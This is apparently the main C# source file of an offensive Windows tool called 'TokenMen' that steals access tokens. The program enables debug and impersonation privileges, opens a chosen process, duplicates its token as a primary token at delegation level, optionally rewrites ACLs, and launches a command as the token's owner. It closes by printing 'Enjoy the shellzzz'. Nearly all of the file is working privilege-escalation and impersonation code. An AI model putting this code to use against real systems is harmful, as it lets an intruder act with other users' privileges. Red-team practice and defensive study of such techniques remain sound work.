using Args;
using System.Diagnostics;

namespace TokenMen;

public class Program
{
    private static readonly string AppName = AppDomain.CurrentDomain.FriendlyName;

    public static void Main(string[] args)
    {
        // TODO: Create Help to spit all args
        ArgParser parser = new(args);
        var parsedArgs = parser.Parse<ArgsOptions>();

        
        if (!parser.IsSet(nameof(parsedArgs.Pid)) || parsedArgs.Command is null)
        {
            Console.WriteLine("[-] Missing pid or command");
            return;
        }


        /// If Interactive, get session ID from user and try uint it otherwise get session ID from our process
        if (parsedArgs.Interactive)
        {
            if (!parser.IsSet(nameof(parsedArgs.SessionId)))
            {
                ProcessIdToSessionId((uint)Process.GetCurrentProcess().Id, out uint sessId);
                parsedArgs.SessionId = sessId;
            }
        }
        Console.WriteLine("[!] Using token from PID: {0} to launch: {1} {2}",
                       parsedArgs.Pid,
                       parsedArgs.Command,
                       parsedArgs.Interactive ? $"with Session ID: {parsedArgs.SessionId}" : "");

        string[] privileges = { SE_DEBUG_NAME, SE_IMPERSONATE_NAME };
        if (!Utils.PrivilegeEnabler(privileges))
            return;
        
        /// Get Handle to the Process chosen by the user
        IntPtr hProc = OpenProcess(PROCESS_ACCESS.PROCESS_QUERY_LIMITED_INFORMATION, false, parsedArgs.Pid);
        if (hProc == IntPtr.Zero)
        {
            Console.WriteLine("[-] OpenProcess Failed. (Error: {0})", GetLastErrorString());
            return;
        }
        Console.WriteLine("[+] Got handle to process");

        /// Get Handle to target Process's Token
        var tokenAccessRights = TokenAccessRights.TOKEN_DUPLICATE | TokenAccessRights.TOKEN_QUERY | TokenAccessRights.TOKEN_ASSIGN_PRIMARY;
        bool res = OpenProcessToken(hProc, tokenAccessRights, out IntPtr hToken);
        if (!res || hToken == IntPtr.Zero)
        {
            Console.WriteLine("[-] Failed to get token handle. (Error: {0})", GetLastErrorString());
            return;
        }
        Console.WriteLine("[+] Got handle to token");

        /// Duplicate to primary token
        tokenAccessRights = TokenAccessRights.TOKEN_ALL_ACCESS;
        bool dup = DuplicateTokenEx(hToken, tokenAccessRights, IntPtr.Zero,
            SECURITY_IMPERSONATION_LEVEL.SecurityDelegation, TOKEN_TYPE.TokenPrimary, out IntPtr hDupToken);
        if (!dup || hDupToken == IntPtr.Zero)
        {
            Console.WriteLine("[-] Failed to duplicate token. (Error: {0})", GetLastErrorString());
            return;
        }
        Console.WriteLine("[+] Token duplicated Successfully");


        if (!parser.IsSet(nameof(parsedArgs.ChangeACL)))
        {
            goto Launcher;
        }
        
        object objTrustee = parsedArgs.ChangeACL switch
        {
            AclActions.Everyone => default,
            AclActions.Dynamic => hDupToken,
            AclActions.Sid => parsedArgs.Trustee,
            AclActions.User => parsedArgs.Trustee,
            _ => hDupToken, /// Use target user by default (less intrusive)
        };

        if (!Acl.Change(parsedArgs.ChangeACL, objTrustee))
        {
            Console.WriteLine("[-] Failed to change ACLs");
            return;
        }
        Console.WriteLine("[+] ACLs changed");

    // TODO: revoke ACL

Launcher:
        Launcher launcher = new(hDupToken, parsedArgs.Command, parsedArgs.Interactive,
            parser.IsSet(nameof(parsedArgs.SessionId)) ? parsedArgs.SessionId : null );

        if (launcher.Launch())
            Console.WriteLine("[+] Enjoy the shellzzz :) ");
    }
}
